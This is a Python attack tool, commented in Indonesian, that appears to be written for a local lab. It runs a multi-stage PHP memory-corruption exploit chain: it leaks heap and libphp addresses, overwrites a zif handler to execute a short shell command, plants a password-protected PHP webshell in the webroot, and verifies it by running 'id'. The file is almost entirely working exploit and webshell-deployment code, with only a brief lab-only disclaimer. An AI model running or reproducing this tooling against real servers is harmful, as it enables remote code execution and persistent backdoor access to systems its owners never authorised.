#!/usr/bin/env python3
"""upshell_lab.py — tanam webshell di TARGET LAB SENDIRI via rantai php2shell.

Cara kerja khusus lab :8095-8426 (bind-mount out/ host -> /out kontainer):
  1. Operator menaruh 2 file di host:  out/u   (script penyalin, sh)
                                       out/w9.php (webshell PHP)
  2. Tool ini menjalankan SATU perintah 9 byte lewat mesin rantai: sh</out/u
     (in-process lib.chain — pagi CLI tetap ketat; tool lab ini eksplisit).
  3. Verifikasi HTTP: GET {url}w9.php dengan POST k/c -> harus jawab.

PAKAI HANYA di lab milik sendiri / otorisasi tertulis. Di target bounty,
perintah eksekusi arbitrer = melanggar RoE mayoritas program.
"""
from __future__ import annotations

import argparse
import sys
import time
import urllib.parse
import urllib.request
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from lib import chain as chain_mod  # noqa: E402


def fire(url: str, cmd: str, *, profile: str = "bookworm",
         tries: int = 2, log=print) -> bool:
    """Jalankan perintah <=14 byte via rantai penuh (blind)."""
    t = chain_mod.Target(url, timeout=30.0, verbose=False)
    t.log = log
    ex = chain_mod.Chain(t, cmd, profile=profile, verbose=False)
    for attempt in range(1, tries + 1):
        try:
            ex.rotate()
            chunk = ex.stage1()
            if not chunk:
                log(f"     stage1 gagal (coba {attempt})")
                continue
            log(f"     chunk=0x{chunk:x}")
            ex.rotate()
            libphp = ex.stage2()
            if not libphp:
                log(f"     stage2 gagal (coba {attempt})")
                continue
            log(f"     libphp=0x{libphp:x}")
            ex.rotate()
            htdata = chunk + ex.htdata_offset
            zif = libphp + ex.zif_offset
            ex.stage3(htdata, zif)
            time.sleep(0.8)
            ex.stage3(htdata, zif)
            return True
        except Exception as exc:  # noqa: BLE001
            log(f"     exc: {exc}")
    return False





def verify(base_url: str, name: str, password: str) -> str:
    data = urllib.parse.urlencode({"k": password, "c": "id"}).encode()
    req = urllib.request.Request(base_url + name, data=data, method="POST")
    try:
        with urllib.request.urlopen(req, timeout=10) as r:
            return r.read().decode("utf-8", "replace")[:200]
    except Exception as exc:  # noqa: BLE001
        return f"(gagal: {exc})"


def main() -> int:
    ap = argparse.ArgumentParser(description="tanam webshell via RCE — LAB ONLY")
    ap.add_argument("-u", "--url", default="http://127.0.0.1:8095/")
    ap.add_argument("--funnel", default="/out/u",
                    help="path script corong DI TARGET (default /out/u)")
    ap.add_argument("--password", default="up9", help="password webshell w9")
    ap.add_argument("--name", default="w9.php", help="nama shell di webroot")
    a = ap.parse_args()

    base = a.url.rstrip("/") + "/"
    cmd = f"sh<{a.funnel}"
    assert len(cmd.encode()) <= 14, len(cmd)
    print(f"[*] stage: {cmd!r} ({len(cmd)} byte)")
    ok = fire(base, cmd)
    print(f"[*] rantai selesai: {ok}")

    print("[*] verifikasi webshell …")
    out = verify(base, a.name, a.password)
    print(f"    {out}")
    if "uid=" in out:
        print("[+] WEBSHELL AKTIF:", base + a.name, f"(password: {a.password})")
        return 0
    print("[-] belum aktif — cek /out/err di target atau offset profil")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
